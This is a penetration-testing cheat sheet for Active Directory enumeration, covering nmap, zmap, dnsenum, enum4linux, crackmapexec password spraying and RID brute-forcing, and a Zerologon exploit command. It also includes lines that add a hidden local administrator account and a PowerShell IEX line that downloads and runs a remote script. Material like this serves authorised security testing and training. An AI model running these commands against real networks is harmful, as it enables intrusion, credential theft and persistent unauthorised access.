# First Steps

## Network Enumeration

```bash
nmap -sP -p $ip #ping scan
nmap -Pn -n -T4 -v3 $ip #quick scan
rustscan -a $ip
```

## Domain Name

```bash
cme smb $network_ip
```

## Domain Controllers

They are usually DNS Servers. They have usually LDAP listening port 389.

```bash
nmap -p53,389 $network_ip

nmcli dev show eth0/interface

nslookup -type=SRV _ldap._tcp.dc.msdcs.<domain.local>
```

## Enumerate alive machines

```bash
sudo zmap -i <iface> -P 2 --probe-module=icmp_echoscan -B 1M --max-targets=10000000 -o targets_rfc1918.txt $network_ips
```

## Enumerate services

### DNS

```bash
# test for dns attacks
dnsenum $domain -f /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt --dnsserver $dns_server_ip > dnsenum.txt
```

### `enum4linux`

Tool for enumerating information from Windows and Samba systems.

#### Basic commands

```bash
# Default command that you will use almost always
enum4linux -a 0.0.0.0
​
# list groups
enum4linux -G 0.0.0.0
​
# list windows shares
enum4linux -S 0.0.0.0
```

### `crackmapexec`

> Post-exploitation tool that helps automate assessing the security of large Active Directory networks.

{% embed url="https://github.com/byt3bl33d3r/CrackMapExec" %}

#### Installation

{% embed url="https://mpgn.gitbook.io/crackmapexec/getting-started/installation/installation-on-unix" %}

```bash
# only in upgraded Windows servers from 2003 - No auth attempt
# to get password policy, minimum length, account lockout threshold
crackmapexec smb domain/IP --pass-pol -u '' -p ''
crackmapexec smb domain/IP -u USER -p WORDLIST	
# The usernames with RID greater than 1000 into a username file
crackmapexec smb vulnet.thm -u robot -p '' --rid-brute | grep  SidTypeUser	
# Enumerate a user share
crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice --shares
```

### UO | Users Enumeration

```bash
GetADUsers.py $domain/ -dc-ip $ip

# More infos with rpcclient
rpcclient -U "" -N $ip

# Get all of the OUs in a domain
Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A

### Create a new user in admin groupe 

# username:password = anon:p3nT3st!
net user anon p3nT3st! /add
net localgroup administrators anon /add

net user anon p3nT3st! /add;net localgroup administrators anon /add

If you cannot import module start a webserver and
IEX(New-Object Net.Webclient).downloadstring('http://<IP>/Powershell.ps1')
```

## Tools

### AD Enum

* ASREPRoasting
* Kerberoasting
* Dump AD as BloodHound JSON files
* Searching GPOs in SYSVOL for cpassword and decrypting
* Run without creds and attempt to gather for further enumeration during the run
* Sample exploits included:
  * CVE-2020-1472

{% embed url="https://github.com/CasperGN/ActiveDirectoryEnumeration" %}

### Install

```bash
pip3 install ActiveDirectoryEnum
python -m ade

# query exploit for poc
python -m ade --exploit cve-2020-1472
```
